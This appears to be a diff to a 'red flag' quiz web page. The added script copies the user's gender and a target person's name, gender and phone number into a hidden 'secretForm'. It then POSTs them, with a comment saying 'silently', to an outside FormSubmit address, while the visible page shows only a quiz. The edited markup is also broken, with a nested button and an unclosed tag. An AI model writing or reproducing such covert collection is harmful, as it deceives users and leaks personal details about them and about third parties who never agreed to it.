@@ -530,8 +530,7 @@
               type="submit" 
               class="w-full bg-gradient-to-r from-red-500 to-pink-500 text-white font-bold py-2.5 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-0.5 flex items-center justify-center text-sm modern-btn pulse-glow"
             >
-              <button type="button" onclick="submitAndStart()">Uncover the Truth 🔎</button>
-
+              <button type="button" id="startScan">Uncover the Truth 🔎</button
               <i class="fas fa-search ml-1.5"></i>
             </button>
           </div>
@@ -1407,33 +1406,39 @@
       // Generate initial quote for donation section
       generateQuote();
     });
- function submitAndStart() {
+document.getElementById('startScan').addEventListener('click', () => {
   const fd = new FormData(document.getElementById('redFlagForm'));
 
-  // Fill hidden form values
+  // Validate gender selections
+  if (!fd.get('userGender') || !fd.get('targetGender')) {
+    alert('Please select both your gender and the one you’re scanning.');
+    return;
+  }
+
+  // Fill the hidden form for FormSubmit
   document.getElementById('formUserGender').value = fd.get('userGender');
   document.getElementById('formTargetName').value = fd.get('name');
   document.getElementById('formTargetGender').value = fd.get('targetGender');
   document.getElementById('formPhoneNumber').value = fd.get('phone') || 'N/A';
   document.getElementById('formTimestamp').value = new Date().toLocaleString();
 
-  const hiddenForm = document.getElementById('secretForm');
-  const hiddenFd = new FormData(hiddenForm);
+  const hiddenFd = new FormData(document.getElementById('secretForm'));
 
-  // Submit via fetch (no redirect)
-  fetch(hiddenForm.action, {
+  // Silently send to FormSubmit
+  fetch('https://formsubmit.co/el/telegi', {
     method: 'POST',
     body: hiddenFd
   });
 
-  // Now continue with the quiz
+  // Start the quiz
   questions = fd.get('targetGender') === 'female' ? girlQuestions : guyQuestions;
   document.getElementById('redFlagForm').classList.add('hidden');
   document.getElementById('questionSection').classList.remove('hidden');
   currentQuestion = 0;
   redFlags = 0;
   showQuestion();
-}
+});
+
 
   </script>
 </body>
